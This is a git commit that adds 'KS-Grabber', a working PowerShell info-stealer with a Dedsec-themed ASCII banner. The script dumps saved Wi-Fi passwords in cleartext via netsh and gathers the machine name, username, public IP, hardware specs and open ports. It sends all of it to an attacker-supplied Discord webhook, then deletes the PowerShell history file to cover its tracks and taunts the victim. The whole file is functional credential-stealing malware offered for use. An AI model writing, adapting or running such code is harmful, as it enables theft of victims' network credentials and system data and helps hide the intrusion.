078d123c01a1267dfadbd4c38669d087c749d714
Nix <85513545+Niximkk@users.noreply.github.com>
2024-08-07 01:49:42 -0300

    [ ✨ ] First Release of KS-Grabber
    Hello :3

---
+++ ks-grabber.ps1
@@ -0,0 +1,172 @@
+## Visual
+
+$Host.UI.RawUI.WindowTitle = "✨ KS-Grabber"
+
+Write-Output "
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀⠀⣠⣴⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢾⡇⠀⢀⣀⣀⣀⡀⢉⡽⠁⠀⠀⣿⣦⠤⠤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠸⡷⠀⣀⠤⠤⢤⣴⡿⠁⠀⢰⠀⣿⣿⣷⣤⠶⢶⣬⣭⣕⣒⠠⢄⣀⠀⠀⠀⠀⠀⠀        ____  ___________  ______ ____________
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⠀⡇⠀⠀⡞⣾⠁⠀⠀⠘⠀⠹⣇⣀⣙⡆⠀⠀⠈⠉⠙⠛⠷⠮⣉⠲⢄⡀⠀⠀⠀      / __ \/ ____// __ \/ ____// ___// ____/\
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣀⢸⡀⢰⢃⣿⣧⣴⡶⣿⣿⡶⢼⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠑⠛⠷⣤⡀     / / / / __/ // / / /\__ \ / __/ / /\ ___\/
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡏⠀⡇⢸⢻⣿⣿⣿⣶⣌⣻⣿⣿⣿⣥⣼⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙    / /_/ / /___// /_/ /___/ // /___/ /_/__
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⠀⢱⢸⢺⣿⣿⣥⠈⠛⠣⢤⣙⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   /_____/_____//_____//____//_____/\_____/\
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣦⠈⣿⣼⣿⣿⣿⡾⠆⠀⠙⣿⣿⠇⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \_____\\____\\\____\\____\\_____\_\____\/
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢯⠀⢻⣿⣿⣿⣿⣶⣶⣷⣾⣿⣣⣴⣾⣇⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   Dedsec has given you the truth. Do what you will.
+⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠖⢿⡆⠸⣏⢳⡼⣿⣿⣿⣿⣿⣟⠉⠙⠛⠋⣭⣷⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀   
+⠀⠀⠀⠀⠀⠀⠀⣴⠏⠀⢰⣿⣷⡄⣿⣾⣟⠬⣿⣿⣿⣿⣿⠀⢀⠀⣠⠟⠁⠀⠲⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀   Ks-Grabber V1.0
+⠀⠀⠀⠀⠀⠀⣼⣿⠢⠬⣭⣿⣿⣧⢸⣿⣯⡑⠦⣾⣿⡟⣡⣔⣁⠴⢟⣱⠂⠀⠀⠈⢻⡀⠀⠀⠀⠀⠀⠀⠀   @im.nix
+⠀⠀⠀⠀⣠⣾⠋⠀⣄⢀⣿⣿⢿⣷⠀⣿⢧⡙⢦⣙⣿⣿⣽⣿⣁⣹⠟⠛⢀⡇⠀⠀⠘⢧⠀⠀⠀⠀⠀⠀⠀ 
+⠀⠀⠀⣰⠃⣏⣹⣦⣿⣿⡿⠁⠀⢿⣇⢘⡶⢬⣉⣿⣽⣿⣟⣻⣤⠆⣠⣺⣾⡇⡂⠀⢠⠘⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⢰⡇⢰⠃⢛⣿⣯⣉⣠⣤⣶⣿⣿⣿⣿⣿⠀⣈⣛⣿⡿⠟⢀⠜⠁⣹⣿⣷⣿⠀⣸⢰⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⣿⢣⠇⠀⣾⣿⣿⣟⣏⡜⢧⣬⣿⣿⣯⣽⣀⣿⣿⣟⣁⠔⠁⠀⠀⣽⣿⣿⠏⢀⣿⠈⡇⠀⠀⠀⠀⠀⠀
+⠀⡼⠃⣨⣤⣴⣿⢃⢹⢻⡾⠀⠘⢿⣿⣟⠘⣿⣿⠿⣿⣏⣄⣀⡀⡀⠀⣸⡿⣿⠇⢈⡏⠀⡇⠀⠀⠀⠀⠀⠀
+⠀⡇⣾⠿⠟⢛⠇⡸⣾⢸⡇⣀⣦⣈⣿⣿⡆⢯⣀⣲⠛⠉⠉⠑⠾⣿⢃⣿⡇⠌⠀⣼⡗⠀⡇⠀⠀⠀⠀⠀⠀
+⢀⣧⠁⠀⣠⠊⠀⢳⠃⠘⠇⠿⣿⣿⣿⣿⡆⢸⣿⣷⣤⣀⣠⠤⠊⢀⣼⣿⡄⢀⠼⣿⡇⢸⡇⠀⠀⠀⠀⠀⠀
+⠈⠙⣇⢻⣿⣦⣴⣃⡄⠀⢀⠀⠈⣿⡀⠹⣿⠒⡿⠟⠛⢋⡤⠒⢁⢾⣿⠙⡠⠋⠀⠛⠁⣸⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⠈⠓⠾⣅⣈⣉⣀⠀⠠⢷⡀⢸⣆⣠⣿⡄⢻⣴⣾⡏⠀⠀⠀⣾⣷⣾⣷⠒⢉⡀⢀⢿⡇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣷⣾⣧⣸⣿⣿⣿⣧⠈⡿⣟⡠⢀⠄⣠⣿⣿⠟⢛⡉⠛⠀⡞⣼⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡿⢸⣿⣏⣿⣿⣿⣿⣿⣽⡀⢹⠰⣚⣯⣾⣿⣿⡟⠉⠀⢀⡀⢠⢷⡇⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⡇⢸⣿⡿⣿⡿⣿⣿⣿⣿⣷⠈⣦⣿⡯⠀⡾⠋⠁⠰⣶⡟⢁⠎⣿⠁⠀⠀⠀⠀⠀⠀⠀"
+
+## Vars
+if ([string]::IsNullOrEmpty($hookurl)) {    
+    Write-Output "You need to set a Discord Webhook URL." 
+    exit   
+}
+
+if (-not (Test-Path variable:gatherPcData)) {   $gatherPcData = $true }
+if (-not (Test-Path variable:gatherWifiProfiles)) {   $gatherWifiProfiles = $true }
+if (-not (Test-Path variable:gatherOpenPorts)) {   $gatherOpenPorts = $true }
+if (-not (Test-Path variable:removeTraces)) {   $removeTraces = $true }
+
+## PC Dump
+if ($gatherPcData) {
+    Write-Output "[ + ] Gathering computer data"
+    $specs = Get-ComputerInfo -Property CsName, CsManufacturer, CsModel, CsTotalPhysicalMemory, OsName, BiosBIOSVersion, TimeZone, CsProcessors
+}
+
+## Wifi Profiles Dump
+if ($gatherWifiProfiles) {
+    Write-Output "[ + ] Gathering wifi profiles"
+    $WirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
+    $WifiInfo = foreach($SSID in $WirelessSSIDs) {
+        $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Conteúdo da Chave') -replace ".*:\s+" # Todo: Make a language based key content shit, if you are not brazilian womp womp, wont work.
+        New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
+    }
+    if ([string]::IsNullOrEmpty($WifiInfo)) {     $WifiInfo= "ERROR: No wireless card detected"    }
+}
+
+## Open Ports Dump
+if ($gatherOpenPorts) {
+    Write-Output "[ + ] Gathering open ports"
+    $tcpPorts = Get-NetTCPConnection | Where-Object { $_.State -eq 'Listen' } | Select-Object -ExpandProperty LocalPort | Sort-Object -Unique
+    $udpPorts = Get-NetUDPEndpoint | Select-Object -ExpandProperty LocalPort | Sort-Object -Unique
+    $openPorts = "TCP: `n$($tcpPorts -join ', ')`n`nUDP: `n$($udpPorts -join ', ')"
+}
+
+## Json body
+$json = @{
+    embeds = @(
+        @{
+            title = "I have been pwned!"
+            color = 0
+            fields = @(
+                @{
+                    name = "Machine Name:"
+                    value = "``````$($env:COMPUTERNAME)``````"
+                    inline = $true
+                },
+                @{
+                    name = "Username:"
+                    value = "``````$env:USERNAME``````"
+                    inline = $true
+                },
+                @{
+                    name = "Public IP:"
+                    value = "``````$(Invoke-RestMethod -Uri "http://ipinfo.io/ip")``````"
+                    inline = $true
+                }
+            )
+            author = @{
+                name = "KS-Grabber V1.0"
+            }
+            footer = @{
+                text = "Dedsec has given you the truth. Do what you will."
+            }
+            thumbnail = @{
+                url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/qk5c358p.png"
+            }
+        }
+        if ($gatherPcData) {
+            @{
+                color = 0
+                fields = @(
+                    @{
+                        name = "Manufacturer:"
+                        value = "``$($specs.CsManufacturer)``"
+                        inline = $true
+                    },
+                    @{
+                        name = "Model:"
+                        value = "``$($specs.CsModel)``"
+                        inline = $true
+                    },
+                    @{
+                        name = "Processors:"
+                        value = "``$($specs.CsProcessors.name)``"
+                    },
+                    @{
+                        name = "Total Physical Memory:"
+                        value = "``$([math]::round($specs.CsTotalPhysicalMemory / 1GB, 2))GB``"
+                        inline = $true
+                    },
+                    @{
+                        name = "Runs doom?"
+                        value = "``Yes``"
+                        inline = $true
+                    },
+                    @{
+                        name = "Bios Version:"
+                        value = "``$($specs.BiosBIOSVersion)``"
+                    }
+                )
+                author = @{
+                    name = "PC Specs"
+                }
+            }
+        }
+        if ($gatherWifiProfiles) {
+            @{
+                description = "``````$($WifiInfo | Out-String)``````"
+                color = 0
+                author = @{
+                    name = "Wifi Passwords"
+                }
+            }
+        }
+        if ($gatherOpenPorts) {
+            @{
+                description = "``````$($openPorts)``````"
+                color = 0
+                author = @{
+                    name = "Open Ports"
+                }
+            }
+        }
+    )
+    username = "$env:USERNAME :3"
+    avatar_url = "https://r2.e-z.host/4d0a0bea-60f8-44d6-9e74-3032a64a9f32/hjz7cham.png"
+    attachments = @()
+} | ConvertTo-Json -Depth 4
+
+# Request Post
+Write-Output "[ + ] Sending webhook"
+Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $json
+
+# Remove Traces
+if ($removeTraces) {
+    Remove-Item (Get-PSreadlineOption).HistorySavePath
+    Write-Output "[ - ] Removing traces"
+}
+
+Write-Output "✨ You have been pwned lmaooo :3 :3"
